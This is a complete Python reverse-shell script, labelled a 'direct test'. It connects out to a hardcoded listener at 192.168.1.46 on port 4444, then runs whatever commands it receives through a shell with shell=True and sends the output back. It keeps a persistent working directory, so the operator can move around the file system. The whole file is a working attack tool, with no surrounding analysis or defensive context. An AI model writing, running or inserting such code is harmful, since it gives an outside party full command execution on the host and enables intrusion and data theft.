#!/usr/bin/env python3

import socket
import subprocess
import os

def direct_test():
    SERVER_HOST = "192.168.1.46"
    SERVER_PORT = 4444
    
    print(f"Direct test - connecting to {SERVER_HOST}:{SERVER_PORT}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_HOST, SERVER_PORT))
        print("Direct connection established!")
        
        # Send immediate test messages
        s.send(b"DIRECT TEST CONNECTION\r\n")
        s.send(b"This is a direct test from Python\r\n")
        s.send(b"Ready for commands:\r\n")
        
        # Initialize current working directory
        current_dir = os.getcwd()
        s.send(f"Current directory: {current_dir}\r\n".encode())
        s.send(f"{current_dir}> ".encode())
        
        # Enhanced command loop with persistent directory
        while True:
            try:
                data = s.recv(1024)
                if not data:
                    break
                    
                command = data.decode('utf-8', errors='ignore').strip()
                print(f"Received: {command}")
                
                if command.lower() in ['exit', 'quit']:
                    s.send(b"Goodbye!\r\n")
                    break
                
                # Handle cd command specially to maintain working directory
                if command.lower().startswith('cd '):
                    try:
                        new_dir = command[3:].strip()
                        if new_dir == '..':
                            new_path = os.path.dirname(current_dir)
                        elif new_dir.startswith('/'):
                            new_path = new_dir
                        else:
                            new_path = os.path.join(current_dir, new_dir)
                        
                        if os.path.exists(new_path) and os.path.isdir(new_path):
                            current_dir = os.path.abspath(new_path)
                            os.chdir(current_dir)
                            output = f"Changed directory to: {current_dir}\n"
                        else:
                            output = f"Directory not found: {new_path}\n"
                    except Exception as e:
                        output = f"Error changing directory: {str(e)}\n"
                elif command.lower() == 'pwd':
                    output = f"{current_dir}\n"
                else:
                    # Execute other commands in the current directory
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10, cwd=current_dir)
                        output = result.stdout + result.stderr
                        if not output.strip():
                            output = "[No output]\n"
                    except Exception as e:
                        output = f"[Error: {str(e)}]\n"
                
                s.send(output.encode('utf-8', errors='ignore'))
                s.send(f"\r\n{current_dir}> ".encode())
                
            except Exception as e:
                print(f"Loop error: {e}")
                break
        
        s.close()
        
    except Exception as e:
        print(f"Connection error: {e}")

if __name__ == "__main__":
    direct_test()
